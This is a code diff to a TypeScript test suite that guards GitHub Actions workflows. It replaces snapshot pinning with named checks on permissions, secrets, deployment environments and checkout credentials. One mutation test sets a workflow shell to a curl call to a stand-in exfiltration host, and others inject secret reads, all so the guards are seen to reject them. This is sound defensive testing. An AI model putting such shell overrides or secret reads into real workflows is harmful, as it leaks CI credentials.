@@ -25,13 +25,9 @@ import { ADMITTED_CONDITION, assertApprovalGatedRequiredCheck } from '../approva
 import { assertDeployWebBuildRun, assertDeployWebJobNoVercelPull } from '../deployWebWorkflowContract';
 import {
     assertWorkflowFileInventory,
-    assertWorkflowSnapshotMatch,
     CONDITIONAL_STEP_ALLOWLIST,
     type ConditionalStepPin,
     HEALTH_GATE_WORKFLOW_FILES,
-    JOB_LEVEL_PERMISSION_FREE_FILES,
-    parseHealthGateWorkflows,
-    readRecordedWorkflowSnapshot,
     SHARD_MATRIX_JOBS,
     STEP_INVENTORY,
 } from '../healthGateWorkflowContract';
@@ -51,6 +47,7 @@ import {
     SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
     SEMANTIC_REVIEW_UPLOAD_ARTIFACT_NAME,
 } from '../semanticReviewWorkflowContract';
+import { assertJobLevelPermissions, assertWorkflowSecuritySurface } from '../workflowSecuritySurfaceContract';
 
 type UnknownRecord = Record<string, unknown>;
 type JobResult = 'cancelled' | 'failure' | 'skipped' | 'success';
@@ -173,9 +170,8 @@ const NATIVE_ADDON_IMPORT = 'NATIVE_ADDON_FILE';
 // The cargo registry index cache layer keys its archive per job: the two
 // native macOS jobs consult different index entries, so a key shared across
 // jobs lets whichever job's post-save ran first fix the archived index for
-// both (#5094, #5136). The recorded snapshot re-records in lockstep with the
-// workflow it pins, so this scoping is asserted against the parsed workflow
-// itself, never against the fixture alone.
+// both (#5094, #5136). This scoping is asserted against the parsed workflow
+// itself.
 const CARGO_INDEX_KEY_PREFIX = 'cargo-index-';
 const CACHE_ACTION_USES_PREFIX = 'actions/cache@';
 const JOB_SCOPE_EXPRESSION = '${{ github.job }}';
@@ -1298,9 +1294,8 @@ function cargoIndexCacheSteps(candidate: UnknownRecord): CargoIndexCacheStep[] {
 }
 
 /**
- * The recorded snapshot re-records in lockstep with the workflow it pins, so a
- * cargo-index key reverted from the per-job form would re-bless itself green.
- * This reads the parsed workflow directly: no two jobs may share a runtime key
+ * A cargo-index key reverted from the per-job form reintroduces the poisoning
+ * race. This reads the parsed workflow directly: no two jobs may share a runtime key
  * or restore prefix — the poisoning race the per-job scoping exists to end —
  * and every key and restore line must carry the per-job expression that keeps
  * them distinct at runtime. The equality clauses run before the expression
@@ -1673,19 +1668,10 @@ function assertShardMatrices(set: WorkflowSet): void {
 }
 
 // A job-level `permissions` block reshapes one leg's token away from the
-// workflow-level pin the permission assertions verify, and no pin read it:
-// `contents: write` on a validation leg would hand every pull request a token
-// that can push. The heavy and nightly files keep their own exact job-level
-// pins (CodeQL, the nightly reporter); these two files must grant nothing.
+// workflow-level pin: `contents: write` on a validation leg would hand every
+// pull request a token that can push.
 function assertNoJobLevelPermissions(set: WorkflowSet): void {
-    for (const file of JOB_LEVEL_PERMISSION_FREE_FILES) {
-        for (const [jobId, jobValue] of Object.entries(recordAt(workflowByFile(set, file), 'jobs'))) {
-            const job = asRecord(jobValue, `${file} job ${jobId}`);
-            if (job.permissions !== undefined) {
-                throw new Error(`${file} job ${jobId} must inherit the workflow-level permissions`);
-            }
-        }
-    }
+    assertJobLevelPermissions(Object.fromEntries(workflowFiles(set)));
 }
 
 // A deleted step fails nothing: the job goes green having never run the
@@ -1738,7 +1724,7 @@ function withWorkflowFiles(files: readonly string[]): () => void {
             for (const file of files) {
                 writeFileSync(join(directory, '.github/workflows', file), 'name: stub\n');
             }
-            assertWorkflowFileInventory(readRecordedWorkflowSnapshot(repositoryRoot), directory);
+            assertWorkflowFileInventory(directory);
         } finally {
             rmSync(directory, { recursive: true, force: true });
         }
@@ -2519,6 +2505,15 @@ describe('health gates workflow contract', () => {
         const privileged = structuredClone(hostedWasm);
         privileged.on = { pull_request_target: {} };
         expect(() => assertHostedWasmWorkflow(privileged)).toThrow('unprivileged PR trigger');
+        // The paths filter must stay exactly the plan's selection inputs: a
+        // dropped crate would stop a stale package from ever being rebuilt.
+        const narrowed = structuredClone(hostedWasm);
+        const narrowedTrigger = recordAt(recordAt(narrowed, 'on'), 'pull_request');
+        narrowedTrigger.paths = arrayAt(narrowedTrigger, 'paths').filter((path) => path !== 'crates/daw-io/**');
+        expect(() => assertHostedWasmWorkflow(narrowed)).toThrow('filtered to the selection inputs');
+        const unfiltered = structuredClone(hostedWasm);
+        delete recordAt(recordAt(unfiltered, 'on'), 'pull_request').paths;
+        expect(() => assertHostedWasmWorkflow(unfiltered)).toThrow('filtered to the selection inputs');
         const omitted = structuredClone(hostedWasm);
         removeStepNamed(jobAt(omitted, 'build-artifacts'), 'Build and qualify complete artifact');
         expect(() => assertHostedWasmWorkflow(omitted)).toThrow('complete ordered build steps');
@@ -2857,8 +2852,6 @@ describe('health gates workflow contract', () => {
         // `defaults` replaces the shell every `run` step uses, a job or step
         // `container` re-environments the job that holds the provider key, and a
         // job or step `env` can set `BASH_ENV` for a command whose text is pinned.
-        // The snapshot is regenerated as a matter of course, so it cannot be the
-        // only pin for any of them.
         const workflowDefaults = structuredClone(semanticReviewWorkflow);
         workflowDefaults.defaults = { run: { shell: 'bash -c "curl -s https://exfil.example"' } };
         expect(() => assertSemanticReviewWorkflow(workflowDefaults)).toThrow('no workflow-level defaults');
@@ -2981,8 +2974,7 @@ describe('health gates workflow contract', () => {
         expect(() => assertSemanticReviewWorkflow(consumerAttemptDownload)).toThrow('the artifact this run uploaded');
 
         // The setup actions' inputs decide what the pinned commands run on;
-        // nothing else reads them, so the Node version is pinned by name and not
-        // only by the regenerable snapshot.
+        // nothing else reads them, so the Node version is pinned by name.
         const driftedNode = structuredClone(semanticReviewWorkflow);
         recordAt(stepNamed(jobAt(driftedNode, 'assess'), 'Set up Node'), 'with')['node-version'] = '24.19.1';
         expect(() => assertSemanticReviewWorkflow(driftedNode)).toThrow('the Node version the assessment runs on');
@@ -4635,78 +4627,6 @@ export -f sudo timeout sleep apt-get
         }
     });
 
-    it('keeps a failed or missing E2E shadow artifact outside every required result', () => {
-        const health = workflowSet().health;
-        const shadow = jobAt(health, 'selection-shadow');
-        expect(shadow.needs).toBe('scope');
-        expect(shadow.outputs).toBeUndefined();
-        expect(shadow['continue-on-error']).toBeUndefined();
-        expect(arrayAt(jobAt(health, 'gate'), 'needs')).toEqual([
-            'admission',
-            'scope',
-            'validation',
-            'affected',
-            'codeql',
-        ]);
-        expect(jobAt(health, 'validation').needs).toBe('scope');
-        expect(jobAt(health, 'affected').needs).toEqual(['scope', 'validation']);
-        expect(stepNamed(shadow, 'Checkout candidate head').with).toEqual({
-            ref: '${{ github.event.pull_request.head.sha }}',
-            'fetch-depth': 0,
-            'persist-credentials': false,
-        });
-        expect(stepNamed(shadow, 'Checkout immutable integration commit').with).toEqual({
-            ref: '${{ github.sha }}',
-            path: 'shadow-integration',
-            'fetch-depth': 0,
-            'persist-credentials': false,
-        });
-        expect(stepNamed(shadow, 'Checkout immutable shadow control').with).toEqual({
-            ref: '${{ github.event.pull_request.base.sha }}',
-            path: 'shadow-control',
-            'fetch-depth': 0,
-            'persist-credentials': false,
-        });
-        expect(stepNamed(shadow, 'Download authoritative scope').with).toEqual({
-            name: 'pr-validation-scope',
-            path: 'shadow-scope',
-        });
-        expect(stepNamed(shadow, 'Set up pnpm').with).toEqual({ package_json_file: 'shadow-control/package.json' });
-        expect(stepNamed(shadow, 'Set up Node').with).toMatchObject({
-            'cache-dependency-path': 'shadow-control/pnpm-lock.yaml',
-        });
-        expect(stepNamed(shadow, 'Install dependencies')['working-directory']).toBe('shadow-control');
-        expect(stepNamed(shadow, 'Upload shadow measurement').with).toMatchObject({
-            name: 'e2e-selection-shadow',
-            'if-no-files-found': 'error',
-        });
-        expect(stepNamed(shadow, 'Upload shadow measurement').if).toBe('${{ always() }}');
-        expect(stepNamed(shadow, 'Measure shadow selection').run).toBe(
-            'node shadow-control/scripts/e2eSelectionShadow.ts shadow-scope/pr-validation-scope.json'
-        );
-        expect(stepNamed(shadow, 'Measure shadow selection').env).toEqual({
-            BASE_SHA: '${{ github.event.pull_request.base.sha }}',
-            HEAD_SHA: '${{ github.event.pull_request.head.sha }}',
-            INTEGRATION_SHA: '${{ github.sha }}',
-            INTEGRATION_ROOT: 'shadow-integration',
-            CONTROL_ROOT: 'shadow-control',
-        });
-        const gateScript = assertGateContract(health, 'gate', 'Gate', GATE_CONDITION);
-        const required = JSON.stringify({
-            admission: { result: 'success', outputs: { admitted: 'true' } },
-            scope: { result: 'success', outputs: { browser: 'true', 'browser-ai': 'false', codeql: 'false' } },
-            validation: { result: 'success' },
-            affected: { result: 'success' },
-            codeql: { result: 'skipped' },
-        });
-        expect(runResultsGuard(gateScript, required)).toBe(0);
-        const diagnosticAsNeed = structuredClone(health);
-        arrayAt(jobAt(diagnosticAsNeed, 'gate'), 'needs').push('selection-shadow');
-        expect(() => assertJobGraph({ ...workflowSet(), health: diagnosticAsNeed })).toThrow(
-            'gate must depend on exactly the pinned member list'
-        );
-    });
-
     it('sweeps every job and step for softening, with only the pinned conditional steps', () => {
         expect(() => assertNoContinueOnError(workflowSet())).not.toThrow();
         expect(() => assertUnconditionalSteps(workflowSet())).not.toThrow();
@@ -4890,25 +4810,10 @@ export -f sudo timeout sleep apt-get
         expect(() => assertNativeTransportMutationProof(candidate)).toThrow();
     });
 
-    it('pins the recorded workflow snapshot, the shard matrices, job-level permissions, and every step inventory', () => {
-        expect(() =>
-            assertWorkflowSnapshotMatch(
-                readRecordedWorkflowSnapshot(repositoryRoot),
-                parseHealthGateWorkflows(repositoryRoot)
-            )
-        ).not.toThrow();
+    it('pins the shard matrices, job-level permissions, and every step inventory', () => {
         expect(() => assertShardMatrices(workflowSet())).not.toThrow();
         expect(() => assertNoJobLevelPermissions(workflowSet())).not.toThrow();
         expect(() => assertStepInventory(workflowSet())).not.toThrow();
-
-        // Mutation-kill: an edit to a key no named pin reads — here the gate
-        // timeout — still fails the harness, because the snapshot pins the
-        // whole parsed file rather than the keys someone enumerated.
-        const driftedTimeout = parseHealthGateWorkflows(repositoryRoot);
-        jobAt(asRecord(driftedTimeout['health-gates.yml'], 'drifted health-gates'), 'gate')['timeout-minutes'] = 10;
-        expect(() => assertWorkflowSnapshotMatch(readRecordedWorkflowSnapshot(repositoryRoot), driftedTimeout)).toThrow(
-            'health-gates.yml drifted from the recorded workflow snapshot'
-        );
 
         // Mutation-kill: a shrunk unit matrix reports green while a quarter of
         // the suite never runs — the review-found hole.
@@ -4936,23 +4841,85 @@ export -f sudo timeout sleep apt-get
         );
     });
 
-    it('refuses a workflows directory that drifts from the recorded file inventory', () => {
-        expect(() =>
-            assertWorkflowFileInventory(readRecordedWorkflowSnapshot(repositoryRoot), repositoryRoot)
-        ).not.toThrow();
+    it('pins every registered workflow security surface by name', () => {
+        const surface = (set: WorkflowSet) => () =>
+            assertWorkflowSecuritySurface(Object.fromEntries(workflowFiles(set)));
+        expect(surface(workflowSet())).not.toThrow();
+
+        // Each mutation below passed every other pin once the whole-file
+        // snapshot was gone; each must fail here on its own.
+        const widenedHeavyLeg = cloneWorkflows('widened heavy e2e permissions');
+        jobAt(widenedHeavyLeg.heavy, 'e2e').permissions = { contents: 'write' };
+        expect(surface(widenedHeavyLeg)).toThrow('heavy-gates.yml job e2e must inherit the workflow-level permissions');
+
+        const widenedReporter = cloneWorkflows('widened nightly reporter permissions');
+        recordAt(jobAt(widenedReporter.nightly, 'nightly-report'), 'permissions').contents = 'write';
+        expect(surface(widenedReporter)).toThrow(
+            'nightly.yml job nightly-report must keep exactly its pinned permissions'
+        );
+
+        const leakedStepSecret = cloneWorkflows('step secret on the scope job');
+        stepNamed(jobAt(leakedStepSecret.health, 'scope'), 'Plan affected checks').env = {
+            ...recordAt(stepNamed(jobAt(leakedStepSecret.health, 'scope'), 'Plan affected checks'), 'env'),
+            TOKEN: '${{ secrets.VERCEL_TOKEN }}',
+        };
+        expect(surface(leakedStepSecret)).toThrow(
+            'health-gates.yml job scope must read exactly its pinned secrets: none'
+        );
+
+        const leakedWorkflowSecret = cloneWorkflows('workflow-level secret');
+        leakedWorkflowSecret.validation.env = { TOKEN: '${{ secrets.VERCEL_TOKEN }}' };
+        expect(surface(leakedWorkflowSecret)).toThrow('validation.yml must not read a secret outside a pinned job');
+
+        const wholeContext = cloneWorkflows('whole secrets context');
+        jobAt(wholeContext.heavy, 'heavy-gate').if = 'always() && toJSON(secrets) != null';
+        expect(surface(wholeContext)).toThrow(
+            'heavy-gates.yml job heavy-gate must read exactly its pinned secrets: none'
+        );
+
+        const extraDeploySecret = cloneWorkflows('extra deploy secret');
+        jobAt(extraDeploySecret.nightly, 'deploy-web').env = { EXTRA: '${{ secrets.JEV_KEY }}' };
+        expect(surface(extraDeploySecret)).toThrow('nightly.yml job deploy-web must read exactly its pinned secrets');
+
+        const inheritedSecrets = cloneWorkflows('secrets inherited by validation');
+        jobAt(inheritedSecrets.prChecks, 'validation').secrets = 'inherit';
+        expect(surface(inheritedSecrets)).toThrow(
+            'pr-checks.yml job validation must not pass secrets to a reusable workflow'
+        );
+
+        const environment = cloneWorkflows('environment on a validation leg');
+        jobAt(environment.validation, 'build').environment = 'Production';
+        expect(surface(environment)).toThrow('validation.yml job build must not name a deployment environment');
+
+        const credentialedDeploy = cloneWorkflows('credentialed deploy checkout');
+        delete recordAt(
+            stepNamed(jobAt(credentialedDeploy.nightly, 'deploy-web'), 'Checkout the validated revision'),
+            'with'
+        )['persist-credentials'];
+        expect(surface(credentialedDeploy)).toThrow(
+            'nightly.yml job deploy-web step Checkout the validated revision must check out with persist-credentials: false'
+        );
+
+        const secondGate = cloneWorkflows('second Gate in health gates');
+        jobAt(secondGate.health, 'admission').name = 'Gate';
+        expect(surface(secondGate)).toThrow('health-gates.yml job admission must not be named Gate');
+    });
+
+    it('refuses a workflows directory that drifts from the registered workflow files', () => {
+        expect(() => assertWorkflowFileInventory(repositoryRoot)).not.toThrow();
         expect(withWorkflowFiles([...HEALTH_GATE_WORKFLOW_FILES])).not.toThrow();
 
         // Mutation-kill: an unregistered workflow the fixed-file parse never reads can
         // still mint a passing Gate over a red head — the review-found hole —
         // so the directory listing itself is pinned.
         expect(withWorkflowFiles([...HEALTH_GATE_WORKFLOW_FILES, 'shadow.yml'])).toThrow(
-            'shadow.yml is not in the recorded workflow file inventory'
+            'shadow.yml is not a registered gate workflow'
         );
 
-        // Mutation-kill: deleting a pinned workflow leaves the record pointing
-        // at a gate that no longer exists.
+        // Mutation-kill: deleting a registered workflow leaves the registry
+        // pointing at a gate that no longer exists.
         expect(withWorkflowFiles(HEALTH_GATE_WORKFLOW_FILES.slice(1))).toThrow(
-            'health-gates.yml is pinned in the recorded workflow file inventory but missing from .github/workflows'
+            'health-gates.yml is a registered gate workflow but missing from .github/workflows'
         );
     });
 
@@ -5047,9 +5014,8 @@ export -f sudo timeout sleep apt-get
     it('scopes every cargo registry index cache key and restore key to its own job', () => {
         expect(() => assertCargoIndexCacheKeysJobScoped(validationWorkflow)).not.toThrow();
 
-        // The pre-#5136 shared forms. The recorded escape: revert a native job
-        // to these and re-record the snapshot — the snapshot leg greens in
-        // lockstep, while this named pin reads the workflow and stays red.
+        // The pre-#5136 shared forms: a native job reverted to these must
+        // turn this named pin red.
         const sharedKey = "cargo-index-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('Cargo.lock') }}";
         const sharedRestoreKeys = 'cargo-index-${{ runner.os }}-${{ runner.arch }}-\n';
 
